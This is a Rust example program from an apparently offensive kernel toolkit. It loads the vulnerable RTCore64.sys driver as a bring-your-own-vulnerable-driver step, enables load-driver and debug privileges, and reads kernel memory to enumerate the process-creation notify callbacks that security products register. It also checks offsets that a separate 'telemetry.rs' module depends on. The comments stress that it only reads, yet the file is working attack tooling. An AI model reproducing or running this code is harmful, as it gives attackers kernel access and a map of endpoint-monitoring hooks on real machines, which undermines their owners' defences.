//! 任务 K 只读探测：分析 Ps*NotifyRoutine 回调结构，验证 telemetry.rs 的
//! ctx→routine 偏移假设。**只 kread，不 kwrite，零 BSOD 风险。**
//!
//! 读 PspCreateProcessNotifyRoutine 数组每个 occupied slot，dump ctx+0x00..
//! +0x40 的值，识别哪个偏移是合法的 routine 指针（指向内核可执行范围）。



#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::offsets::notify_routines;
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::KernelRw;

#[cfg(target_os = "windows")]
const SYS_PATH: &[u16] = &[
    'S' as u16,
    'y' as u16,
    's' as u16,
    't' as u16,
    'e' as u16,
    'm' as u16,
    '3' as u16,
    '2' as u16,
    '\\' as u16,
    'd' as u16,
    'r' as u16,
    'i' as u16,
    'v' as u16,
    'e' as u16,
    'r' as u16,
    's' as u16,
    '\\' as u16,
    'R' as u16,
    'T' as u16,
    'C' as u16,
    'o' as u16,
    'r' as u16,
    'e' as u16,
    '6' as u16,
    '4' as u16,
    '.' as u16,
    's' as u16,
    'y' as u16,
    's' as u16,
    0,
];
#[cfg(target_os = "windows")]
const SVC_NAME: &[u16] = &[
    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
];
#[cfg(target_os = "windows")]
const PSP_CREATE_PROCESS_NOTIFY_RVA: u32 = 0x4D9D70;

#[cfg(target_os = "windows")]
extern "system" {
    fn RtlAdjustPrivilege(
        privilege: u32,
        enable: i32,
        current_thread: i32,
        enabled: *mut i32,
    ) -> i32;
}
#[cfg(target_os = "windows")]
fn enable_privileges() {
    for luid in [10u32, 20u32] {
        let mut p: i32 = 0;
        unsafe { RtlAdjustPrivilege(luid, 1, 0, &mut p) };
    }
}

/// 判断一个 u64 是否像内核可执行地址 (0xFFFFF8xxxxxxxxxx 范围，
/// 对齐 0x10 的代码入口典型)。
#[cfg(target_os = "windows")]
fn looks_like_kexec_ptr(v: u64) -> bool {
    (v & 0xFFFFF000_00000000) == 0xFFFFF000_00000000 && v >= 0xFFFFF800_00000000
}

#[cfg(target_os = "windows")]
fn main() {
    println!("[callback_probe] READ-ONLY analysis of Psp*NotifyRoutine structure");
    enable_privileges();

    let (mut loaded, krw) = unsafe {
        match bootstrap_byovd(SYS_PATH, SVC_NAME) {
            Ok(t) => t,
            Err(e) => {
                eprintln!("[FAIL] bootstrap: {}", e);
                std::process::exit(1);
            }
        }
    };
    let base = unsafe { kernel_base::ntoskrnl_base() }.unwrap();
    let array_kva = base + PSP_CREATE_PROCESS_NOTIFY_RVA as usize;
    println!(
        "ntoskrnl base=0x{:016x} PspCreateProcessNotifyRoutine=0x{:016x}",
        base, array_kva
    );

    // 枚举 occupied slots
    let mut slots = Vec::new();
    for i in 0..notify_routines::ARRAY_LEN {
        let packed = match krw.kread_u64(array_kva + i * 8) {
            Ok(v) => v,
            Err(_) => continue,
        };
        if !notify_routines::is_occupied(packed) {
            continue;
        }
        let ctx = notify_routines::unpack(packed) as usize;
        slots.push((i, packed, ctx));
    }
    println!("\n{} occupied CreateProcess slot(s):\n", slots.len());

    for (i, packed, ctx) in &slots {
        println!("=== slot[{}] ===", i);
        println!("  packed=0x{:016x} ctx(unpacked)=0x{:016x}", packed, ctx);
        // telemetry.rs 假设 routine = *(ctx+0)。验证这个假设。
        // dump ctx+0x00..+0x40 的 QWORDs，标记哪些像内核可执行指针。
        for off in (0..0x40).step_by(8) {
            let v = krw.kread_u64(ctx + off).unwrap_or(0xDEAD);
            let flag = if looks_like_kexec_ptr(v) {
                " <-- looks like kexec ptr"
            } else {
                ""
            };
            println!("    ctx+0x{:02x} = 0x{:016x}{}", off, v, flag);
        }
        // 关键：telemetry.rs 用 ctx+0。如果 ctx+0 不像 routine 指针，那就是 bug。
        let assumed_routine = krw.kread_u64(*ctx).unwrap_or(0);
        let assumed_ok = looks_like_kexec_ptr(assumed_routine);
        println!(
            "  >> telemetry.rs assumption (routine=*(ctx+0)=0x{:016x}) {}",
            assumed_routine,
            if assumed_ok {
                "PLAUSIBLE"
            } else {
                "WRONG — not a kexec ptr"
            }
        );
        // 如果错误，找出 ctx 内哪个偏移才像 routine。
        if !assumed_ok {
            for off in (0..0x40).step_by(8) {
                let v = krw.kread_u64(ctx + off).unwrap_or(0);
                if looks_like_kexec_ptr(v) {
                    println!(
                        "     * candidate routine at ctx+0x{:02x} = 0x{:016x}",
                        off, v
                    );
                }
            }
        }
        println!();
    }

    println!("[callback_probe] DONE (read-only, no kernel writes).");
    std::mem::forget(loaded);
}


// ----------------------------------------------------------------------------
// Non-Windows entry-point fallback (E0601 mitigation).
//
// The real `fn main()` (and every Windows-only item above) is gated by
// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
// body compiles to nothing and the build would fail with E0601 ("main
// function not found"). This stub exists solely to satisfy the crate root on
// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
// mutually exclusive with the Windows `main` above and never runs on target.
// ----------------------------------------------------------------------------
#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!(
        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
        env!("CARGO_BIN_NAME")
    );
}
